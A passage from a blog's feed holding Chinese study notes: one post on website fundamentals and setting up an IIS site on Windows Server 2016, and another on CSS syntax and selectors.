    <category term="web前端" scheme="https://sun-spots.github.io/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>web站点搭建</title>
    <link href="https://sun-spots.github.io/2022/01/13/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%80%E5%91%A8/1.4web%E7%AB%99%E7%82%B9%E6%90%AD%E5%BB%BA/"/>
    <id>https://sun-spots.github.io/2022/01/13/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%80%E5%91%A8/1.4web%E7%AB%99%E7%82%B9%E6%90%AD%E5%BB%BA/</id>
    <published>2022-01-13T15:05:00.000Z</published>
    <updated>2022-01-19T10:00:41.018Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web站点搭建"><a class="markdownIt-Anchor" href="#web站点搭建">#</a> web 站点搭建</h1><h3 id="一基础知识"><a class="markdownIt-Anchor" href="#一基础知识">#</a> 一：基础知识</h3><p><strong>1. 网站</strong>：指在因特网上根据一定的规则，使用 HTML、CSS、jsp 等脚本语言与工具制作的用于展示特定内容相关网页的集合。简单地说，网站是一种沟通工具，人们可以通过网站来发布自己想要公开的资讯，或者利用网站来提供相关的网络服务。人们可以通过网页浏览器来访问网站，获取自己需要的资讯或者享受网络服务。</p><p><strong>网站的分类</strong>：</p><ol><li><ul><li><p>根据网站所用编程语言分类：例如 asp 网站、php 网站、jsp 网站、Asp. net 网站等；</p></li><li><p>根据网站的用途分类：例如门户网站（综合网站）、行业网站、娱乐网站等；</p></li></ul></li><li><ul><li><p>根据网站的功能分类：例如单一网站（企业网站）、多功能网站（网络商城）等等。</p></li><li><p>根据网站的持有者分类：例如个人网站、商业网站、政府网站、教育网站等。</p></li></ul></li><li><ul><li>根据网站的商业目的分类：营利型网站（行业网站、论坛）、非营利性型网站（企业网站、政府网站、教育网站）。</li></ul></li></ol><p>适合类型：ASP（个人）、PHP（企业，门户，商务）、<span class="exturl" data-url="aHR0cDovL0FTUC5ORVQ=">ASP.NET</span>（企业，门户，商务）<br>PHP（不适合大型）&gt;NET（比较适合中、大型）<br>JSP&gt;PHP &gt; <span class="exturl" data-url="aHR0cDovL0FTUC5ORVQ=">ASP.NET</span>，比如安全高、安全中、安全低。</p><p><strong>2. 域名</strong>：简称域名、网域，是由一串用点分隔的名字组成的 Internet 上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。PS: 域名会被解析到一个唯一的公网 IP 地址上，当然通过 IP 也是可以去对网站进行访问。</p><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/8e4939b5eeb1b956.png" alt=""></p><p><strong>3. 空间</strong>：</p><p>常见网站空间：虚拟主机（虚拟空间），独立服务器，云主机，VPS。</p><p>虚拟主机：是在网络服务器上划分出一定的磁盘空间供用户放置站点、应用组件等；提供必要的站点功能、数据存放和传输功能。所谓虚拟主机，也叫 “网站空间”，就是把一台运行在互联网上的服务器划分成多个 “虚拟” 的服务器。每一个虚拟主机都具有独立的域名和完整的 Internet 服务器（支持 WWW、FTP、E-mail 等）功能。</p><p>云主机 /vps: 云主机又称为云计算服务器或云服务器，是云计算服务体系中的一项主机产品。云 z 主机是一种类似 VPS 服务器的虚拟化技术。也可以理解是 VPS 的升级版，与 VPS 还有所不同是，它是在一组集群服务器上划分出来的多个类似独立主机的部分。</p><p><strong>4.web 网站的四大组成部分</strong>：服务器、数据库、web 容器（中间件）、脚本语言</p><p><strong>5.web 容器简介</strong></p><p>web 容器就是一种服务程序，在服务器中一个端口就对应一个提供相应服务的程序（比如 Apache 默认的端口为 80），而这个程序就是处理服务器从客户端收到的请求，如 Java 中的 Tomcat 容器，ASP 的 IIS 都是这样的容器。一个服务器可以有多个容器。</p><p>常见的 WEB 容器：IIS、Apache、Nginx、Tomcat、Jboss、WebLogic</p><p><strong>6. 脚本语言介绍</strong></p><p>脚本语言是一种 web 端的网页源代码。它又分为静态和动态网站。</p><p>静态：不与数据库发生交互，包括 html、html5、shtml。</p><p>动态：与数据库进行交互来获取、存储数据，包括 asp、aspx、php、jsp 等。</p><p><strong>7. 数据库介绍</strong></p><p>数据库是存放数据的仓库。它的存储空间很大，可以存放百万条、千万条、上亿条数据。但是数据库并不是随意地将数据进行存放，是有一定的规则的，否则查询的效率会很低。</p><p>常见的数据库：</p><p>Access 数据库：小型数据库，性能低，安全性低，无需登录账号密码。</p><p>Sqlserver 数据库：轻量级中小型，也叫 mssql 数据库，微软的数据库，需要登录账户密码，最高权限管理员名称：sa。</p><p>Mysql 数据库：轻量级，需要账户密码，被 Oracle 收购了，最高权限管理员名称：root。</p><p>Oracle 数据库：属于甲骨文公司，大型数据库，一个数据库可以建立很多数据库，最高权限管理员名称： sys。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Mirsoft ACCESS </span><br><span class="line">Mirsoft SQLServer </span><br><span class="line">MySQL（ORACLE）</span><br></pre></td></tr></table></figure><p><strong>8. 服务器介绍</strong></p><p><strong>8.1 简介</strong>：服务器是一种高性能计算机，某方面其性能是普通计算机的几倍甚至更多，它作为网络节点，提供文件存储等服务，供客户端数据等服务，是互联网的灵魂。</p><p><strong>8.2 常见的服务器：</strong></p><p>Windows：</p><p>Windows server2003IIS6.0</p><p>Windows server2008IIS7.0</p><p>Windows server2012IIS8.0</p><p>Windows server2016IIS8.5</p><p>Windows10IIS10.0</p><p>Linux：</p><p>Ubuntu</p><p>Red Hat Enterprise Linux (RHEL)</p><p>SUSE Linux Enterprise Server</p><p>CentOS (Community OS) Linux Server</p><p>Debian</p><p><strong>8.3web 常见的网站搭建架构：</strong><br>Windows + IIS + Access + asp/aspx<br>Windows + IIS + SQLserver + asp/aspx<br>Windows + APache + Mysql + PHP<br>Windows + Nginx + Mysql/ORACLE + JSP</p><p>Linux + Apache + Mysql + PHP  (LAMP)<br>Linux + Nginx + Mysql + PHP (LNMP)<br>Linux + Apache + Mysql + JSP<br>Linux + Nginx + Oracle + JSP<br>Linux + Tomcat、Jboss、WebLogic + MySQL/Oracle + Jsp</p><h3 id="二web服务器搭建"><a class="markdownIt-Anchor" href="#二web服务器搭建">#</a> 二：web 服务器搭建</h3><p><strong>window serivce2016：</strong></p><ul><li><p>在服务器管理器界面点击 “添加角色与功能”</p><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/3abb86dee48ec519.png" alt=""></p></li><li><p>安装类型与服务器选择均默认，服务器角色选择 -----web 服务器</p><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/a4d3c419c5d0b473.png" alt=""></p></li><li><p>功能选择 -----IIS 可承载 web 核心</p><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/fc3a69addced39ce.png" alt=""></p></li><li><p>在此页面下找到以下选项选中即可</p><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/00c83445b741a176.png" alt=""></p></li><li><p>打开管理工具，选择 internet information service</p><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/2573d508c78b1744.png" alt=""></p></li><li><p>选择网站右键添加网站</p><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/0833c62de01a43a4.png" alt=""></p></li><li><p>填写网络名称、物理路径，将应用程序池改为图中值并选择 ip</p><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/100614fc3279f959.png" alt=""></p></li><li><p>右键点击创建的网站，重新启动即可</p><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/5f0b7b99f1c6eae3.png" alt=""></p><h3 id="3常见的错误"><a class="markdownIt-Anchor" href="#3常见的错误">#</a> 3 常见的错误</h3><p>3.1 若浏览器中出现文件夹中所有的文件，而没有出现初始页面，则此时应该在默认文档中加入网站初始页面的文件</p><p><img data-src="https://s3.bmp.ovh/imgs/2022/01/b3dd4412dd0ecec6.png" alt=""></p><p><a href="https://imgtu.com/i/7rjx91"><img data-src="https://s4.ax1x.com/2022/01/19/7rjx91.png" alt="7rjx91.png"></a></p><p>3.2 若浏览器中出现 403 错误，此时文件目录的访问权限出现问题，修改目录浏览，启用即可</p><p><a href="https://imgtu.com/i/7rviHe"><img data-src="https://s4.ax1x.com/2022/01/19/7rviHe.png" alt="7rviHe.png"></a></p><p>3.3 若浏览器中出现数据库文件出错相关的问题。可以尝试将应用程序池中的 Class.Net 中的高级设置中的启用 32 位应用程序设置为 true</p><p><a href="https://imgtu.com/i/7rvQHg"><img data-src="https://s4.ax1x.com/2022/01/19/7rvQHg.png" alt="7rvQHg.png"></a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web站点搭建&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#web站点搭建&quot;&gt;#&lt;/a&gt; web 站点搭建&lt;/h1&gt;
&lt;h3 id=&quot;一基础知识&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#一基础知识&quot;&gt;</summary>
      
    
    
    
    <category term="信息安全—网络渗透" scheme="https://sun-spots.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E2%80%94%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>CSS语法与选择器</title>
    <link href="https://sun-spots.github.io/2022/01/13/%E4%BF%AE%E6%94%B9/CSS%E8%AF%AD%E6%B3%95%E4%B8%8E%E9%80%89%E6%8B%A9%E5%99%A8/"/>
    <id>https://sun-spots.github.io/2022/01/13/%E4%BF%AE%E6%94%B9/CSS%E8%AF%AD%E6%B3%95%E4%B8%8E%E9%80%89%E6%8B%A9%E5%99%A8/</id>
    <published>2022-01-13T11:59:12.000Z</published>
    <updated>2022-01-14T13:47:18.874Z</updated>
    
    <content type="html"><![CDATA[<p>笔记来源：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMVhKNDExWDdVZA==">尚硅谷 Web 前端 HTML5&amp;CSS3 初学者零基础入门全套完整版</span></p><p>​                    <span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL3UyMTE5NTE4My9oZmNhbWcvY29hbG00">https://www.yuque.com/u21195183/hfcamg/coalm4</span></p><h1 id="css语法与选择器"><a class="markdownIt-Anchor" href="#css语法与选择器">#</a> CSS 语法与选择器</h1><h2 id="1-css简介"><a class="markdownIt-Anchor" href="#1-css简介">#</a> 1. CSS 简介</h2><h3 id="层叠样式表"><a class="markdownIt-Anchor" href="#层叠样式表">#</a> 层叠样式表</h3><p>网页实际上是一个多层的结构，通过 CSS 可以分别为网页的每一个层来设置样式，而最终我们能看到只是网页的最上边一层</p><p>总之一句话，CSS 用来设置网页中元素的样式</p><p>使用 CSS 来修改元素样式的方式大致可以分为 3 种</p><h3 id="内联样式行内样式"><a class="markdownIt-Anchor" href="#内联样式行内样式">#</a> 内联样式（行内样式）</h3><p>在标签内部通过 <code>style</code>  属性来设置元素的样式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color:red;font-size:60px;&quot;</span>&gt;</span>内联样式（行内样式）<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>问题：使用内联样式，样式只能对一个标签生效。如果希望影响到多个元素，必须在每一个元素中都复制一遍；并且当样式发生变化时，我们必须要一个一个的修改，非常的不方便。（注意：开发时绝对不要使用内联样式）</p><h3 id="内部样式表"><a class="markdownIt-Anchor" href="#内部样式表">#</a> 内部样式表</h3><p>将样式编写到 <code>head</code>  中的 <code>style</code>  标签里然后通过 css 的选择器来选中元素并为其设置各种样式可以同时为多个标签设置样式，并且修改时只需要修改一处即可。内部样式表更加方便对样式进行复用</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line"><span class="selector-tag">p</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>:green; </span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">50px</span>;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>问题：我们的内部样式表只能对一个网页起作用，它里边的样式不能跨页面进行复用</p><h3 id="外部样式表"><a class="markdownIt-Anchor" href="#外部样式表">#</a> 外部样式表</h3><p>可以将 css 样式编写到一个外部的 CSS 文件中，然后通过 <code>link</code>  标签来引入外部的 CSS 文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./style.css&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>外部样式表需要通过 <code>link</code>  标签进行引入，意味着只要想使用这些样式的网页都可以对其进行引用使样式，可以在不同页面之间进行复用</p><p>将样式编写到外部的 CSS 文件中，可以使用到浏览器的缓存机制，从而加快网页的加载速度，提高用户的体验。</p><h2 id="2-css基本语法"><a class="markdownIt-Anchor" href="#2-css基本语法">#</a> 2. CSS 基本语法</h2><h4 id="css中的注释"><a class="markdownIt-Anchor" href="#css中的注释">#</a> css 中的注释</h4><p>只能使用 <code>/*</code>  注释内容 <code>*/</code>  包裹。可以同时注释多行与单行注释。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* css中的单行注释 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">css中的多行注释</span></span><br><span class="line"><span class="comment">css中的多行注释</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="html中的注释"><a class="markdownIt-Anchor" href="#html中的注释">#</a> html 中的注释</h4><p>只能使用 <code>&lt;!--注释内容</code> –&gt; 包裹。可以同时注释多行与单行注释。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- html中的单行注释 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">html中的多行注释</span></span><br><span class="line"><span class="comment">html中的多行注释</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h3 id="基本语法"><a class="markdownIt-Anchor" href="#基本语法">#</a> 基本语法</h3><p>CSS 的基本语法是由选择器和声明块组成。形如：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">P</span>&#123;</span><br><span class="line"><span class="attribute">color</span>：red；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在每一条的结束后用 “；” 隔开每一条语句。</p><h4 id="选择器"><a class="markdownIt-Anchor" href="#选择器">#</a> 选择器</h4><p>通过选择器可以选中页面中的指定元素</p><ul><li>比如 <code>p</code>  的作用就是选中页面中所有的 <code>p</code>  元素声明块</li></ul><h4 id="声明块"><a class="markdownIt-Anchor" href="#声明块">#</a> 声明块</h4><p>通过声明块来指定要为元素设置的样式</p><ul><li><p>声明块由一个一个的声明组成，声明是一个名值对结构</p></li><li><p>一个样式名对应一个样式值，名和值之间以 <code>:</code>  连接，以 <code>;</code>  结尾</p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">h1</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: green;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-css选择器"><a class="markdownIt-Anchor" href="#3-css选择器">#</a> 3. CSS 选择器</h2><h3 id="通配选择器universal-selector"><a class="markdownIt-Anchor" href="#通配选择器universal-selector">#</a> 通配选择器（Universal selector）</h3><ul><li><p>作用：选中 html 页面中出现的所有的标签。</p></li><li><p>语法： <code>*&#123;&#125;</code></p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*&#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="元素选择器type-selector"><a class="markdownIt-Anchor" href="#元素选择器type-selector">#</a> 元素选择器（Type selector）</h3><p>也叫类型选择器、标签选择器</p><ul><li><p>作用：选中 html 页面中的一种标签，无论标签的属性有何不同，只要标签名相同即被选中</p></li><li><p>语法： <code>elementname&#123;&#125;</code></p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: red; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">h1</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: green;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="类选择器class-selector"><a class="markdownIt-Anchor" href="#类选择器class-selector">#</a> 类选择器（Class selector）</h3><ul><li><p>作用：选中 html 页面中 class 属性值相同的所有的标签</p></li><li><p>语法： <code>.classname</code> {}</p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.blue</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: blue;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.size</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class`是一个标签的属性，它和`id`类似，不同的是`class</span><br></pre></td></tr></table></figure><ul><li><p>可以重复使用，</p></li><li><p>可以通过 <code>class</code>  属性来为元素分组，</p></li><li><p>可以同时为一个元素指定多个 <code>class</code>  属性</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;blue size&quot;</span>&gt;</span> 类选择器（Class selector）<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="id选择器id-selector"><a class="markdownIt-Anchor" href="#id选择器id-selector">#</a> ID 选择器（ID selector）</h3><ul><li><p>作用：根据元素的 <code>id</code>  属性值选中一个元素，<strong>一个 html 页面中只能由一个 id 值，虽然重复的 id 值在 css 中也可以起作用，但是不可使用，以防在以后的开发中报错！</strong></p></li><li><p>语法： <code>#idname&#123;&#125;</code></p></li><li><p>例子： <code>#box&#123;&#125;</code>   <code>#red&#123;&#125;</code></p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#red</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="属性选择器attribute-selector"><a class="markdownIt-Anchor" href="#属性选择器attribute-selector">#</a> 属性选择器（Attribute selector）</h3><ul><li><p>作用：根据元素的属性值选中一组元素</p></li><li><p>语法 1： <code>[属性名]</code>  选择含有指定属性的元素</p></li><li><p>语法 2： <code>[属性名=属性值]</code>  选择含有指定属性和属性值的元素</p></li><li><p>语法 3： <code>[属性名^=属性值]</code>  选择属性值以指定值开头的元素</p></li><li><p>语法 4： <code>[属性名$=属性值]</code>  选择属性值以指定值结尾的元素</p></li><li><p>语法 5： <code>[属性名*=属性值]</code>  选择属性值中含有某值的元素</p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span><span class="selector-attr">[title]</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: orange;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-attr">[title=e]</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: orange;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-attr">[title^=e]</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: orange;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-attr">[title$=e]</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: orange;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-attr">[title*=e]</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: orange;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-复合选择器"><a class="markdownIt-Anchor" href="#4-复合选择器">#</a> 4. 复合选择器</h2><h3 id="交集选择器"><a class="markdownIt-Anchor" href="#交集选择器">#</a> 交集选择器</h3><ul><li><p>作用：选中同时复合多个条件的元素</p></li><li><p>语法： <code>选择器1选择器2选择器3选择器n&#123;&#125;</code></p></li><li><p>注意点：交集选择器中如果有元素选择器，必须使用元素选择器开头</p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span><span class="selector-class">.red</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">30px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.a</span><span class="selector-class">.b</span><span class="selector-class">.c</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: blue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="并集选择器选择器分组"><a class="markdownIt-Anchor" href="#并集选择器选择器分组">#</a> 并集选择器（选择器分组）</h3><ul><li><p>作用：同时选择多个选择器对应的元素</p></li><li><p>语法： <code>选择器1,选择器2,选择器3,选择器n&#123;&#125;</code></p></li><li><p>例子： <code>#b1,.p1,h1,span,div.red&#123;&#125;</code></p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">h1</span>,<span class="selector-tag">span</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: green;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-关系选择器"><a class="markdownIt-Anchor" href="#5-关系选择器">#</a> 5. 关系选择器</h2><ul><li><p>父元素：直接包含子元素的元素叫做父元素</p></li><li><p>子元素：直接被父元素包含的元素是子元素</p></li><li><p>祖先元素：直接或间接包含后代元素的元素叫做祖先元素；一个元素的父元素也是它的祖先元素</p></li><li><p>后代元素：直接或间接被祖先元素包含的元素叫做后代元素；子元素也是后代元素</p></li><li><p>兄弟元素：拥有相同父元素的元素是兄弟元素</p></li></ul><h3 id="子元素选择器child-combinator"><a class="markdownIt-Anchor" href="#子元素选择器child-combinator">#</a> 子元素选择器（Child combinator）</h3><ul><li><p>作用：选中指定父元素的指定子元素</p></li><li><p>语法： <code>父元素 &gt; 子元素</code></p></li><li><p>例子： <code>A &gt; B</code></p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span><span class="selector-class">.box</span> &gt; <span class="selector-tag">p</span> &gt; <span class="selector-tag">span</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: orange;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="后代元素选择器descendant-combinator"><a class="markdownIt-Anchor" href="#后代元素选择器descendant-combinator">#</a> 后代元素选择器（Descendant combinator）</h3><ul><li><p>作用：选中指定元素内的指定后代元素</p></li><li><p>语法： <code>祖先 后代</code></p></li><li><p>例子： <code>A B</code></p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> <span class="selector-tag">span</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: skyblue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="兄弟元素选择器sibling-combinator"><a class="markdownIt-Anchor" href="#兄弟元素选择器sibling-combinator">#</a> 兄弟元素选择器（Sibling combinator）</h3><ul><li><p>作用：选择下一个兄弟</p></li><li><p>语法： <code>前一个 + 下一个</code>   <code>前一个 + 下一组</code></p></li><li><p>例子 1： <code>A1 + A2</code> （Adjacent sibling combinator）</p></li><li><p>例子 2：   <code>A1 ~ An</code> （General sibling combinator）</p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span> + <span class="selector-tag">span</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">p</span> ~ <span class="selector-tag">span</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-伪类选择器"><a class="markdownIt-Anchor" href="#6-伪类选择器">#</a> 6. 伪类选择器</h2><p>伪类（不存在的类，特殊的类）</p><p>伪类用来描述一个元素的特殊状态，比如：第一个子元素、被点击的元素、鼠标移入的元素.…</p><p>伪类一般情况下都是使用 <code>:</code>  开头</p><ul><li><p><code>:first-child</code>  第一个子元素</p></li><li><p><code>:last-child</code>  最后一个子元素</p></li><li><p><code>:nth-child()</code>  选中第 n 个子元素</p></li><li><ul><li>n：第 n 个，n 的范围 0 到正无穷</li></ul></li><li><ul><li>2n 或 even：选中偶数位的元素</li></ul></li><li><ul><li>2n+1 或 odd：选中奇数位的元素</li></ul></li></ul><p>以上这些伪类都是根据所有的子元素进行排序的</p><ul><li><p><code>:first-of-type</code>  同类型中的第一个子元素</p></li><li><p><code>:last-of-type</code>  同类型中的最后一个子元素</p></li><li><p><code>:nth-of-type()</code>  选中同类型中的第 n 个子元素</p></li></ul><p>这几个伪类的功能和上述的类似，不同点是他们是在同类型元素中进行排序的</p><ul><li><code>:not()</code>  否定伪类，将符合条件的元素从选择器中去除</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ul下所有li，黑色 */</span></span><br><span class="line"><span class="selector-tag">ul</span>&gt;<span class="selector-tag">li</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: black;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ul下第偶数个li，黄色 */</span></span><br><span class="line"><span class="selector-tag">ul</span>&gt;<span class="selector-tag">li</span><span class="selector-pseudo">:nth-child</span>(<span class="number">2</span>n) &#123;</span><br><span class="line">    <span class="attribute">color</span>: yellow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ul下第奇数个li，绿色 */</span></span><br><span class="line"><span class="selector-tag">ul</span>&gt;<span class="selector-tag">li</span><span class="selector-pseudo">:nth-child</span>(odd) &#123;</span><br><span class="line">    <span class="attribute">color</span>: green;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ul下第一个li，红色 */</span></span><br><span class="line"><span class="selector-tag">ul</span>&gt;<span class="selector-tag">li</span><span class="selector-pseudo">:first</span>-child &#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ul下最后一个li，黄色 */</span></span><br><span class="line"><span class="selector-tag">ul</span>&gt;<span 